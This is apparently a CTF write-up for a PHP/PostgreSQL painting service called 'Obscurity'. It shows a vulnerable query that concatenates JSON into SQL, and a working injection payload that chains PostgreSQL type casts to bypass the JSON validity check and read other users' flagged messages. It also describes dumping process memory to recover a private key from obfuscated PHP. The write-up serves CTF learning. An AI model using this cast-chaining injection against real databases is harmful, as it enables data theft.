# Obscurity

## Description

The service is a collaborative online painter. The backend is written on PHP
and uses PostgreSQL db.

## Flags

After registration user can draw geometric figures and text. Flags are
in text messages. Normally, to read the flag, user needs to know its password.

## Vulnerability

There is an SQL-injection in this code:

```
$result = pg_query($db, "SELECT add_action(a:='".json_encode($action_data)."', u:=".$userid.")");
```

The varable `$action_data` is partially controlled by the attacker, for example she can control this content:

```
"action_data":{
   "color": "#abcdef",
   "tool": "text",
   "params": {
         "content": "..."
   }
}
```

First argument of function `add_action()` has type `json`:

```
    CREATE FUNCTION add_action(a json, u int)
        RETURNS int as $$
        declare actionid int;
    BEGIN
        INSERT INTO actions (userid, action) VALUES (u, a) RETURNING id INTO actionid;
        RETURN actionid;
    END;
    $$ language plpgsql SECURITY DEFINER SET search_path = public;
```

Usual exploitation techniques won't work here. If the single quote is passed, the json will be not valid anymore, because
all next double quotes in the "content" will be escaped. The concatenation also will not work, because it is executed only
after the left argument is successfully converted to json.

## The Exploitation

To exploit the service one need to use PostgreSQL syntax to convert arguments to different types in such way that the last type is a valid json.

The payload:

```
"action_data":{
    "color": "#abcdef",
    "tool": "text",
    "params": {
        "content": "'::xid::text::json,u:=1);select add_action(to_json(get_actions(42)),123) as id -- ",
    }
}
```

The convertation to xid type converts the left part to 0, which is a valid json after converting to text.

Other convertation chains are possible.

The full sploit can be found at [/sploits/obscurity/spl.py](../../sploits/obscurity/spl.py).


## Patching

To make sniffing more difficult, the parameters of api-calls are encrypted with RSA. The public key is store in the frontend, the private key is in the backend.

The backend is obfuscated with SourceGuardian. The unobfuscated version is also given, but without the private key. So, to patch the vulnerability,
one need to get the key from the obfuscated version. The simplest way to do it is to import obfuscated php-file with php, dump the process memory and find the key in it.
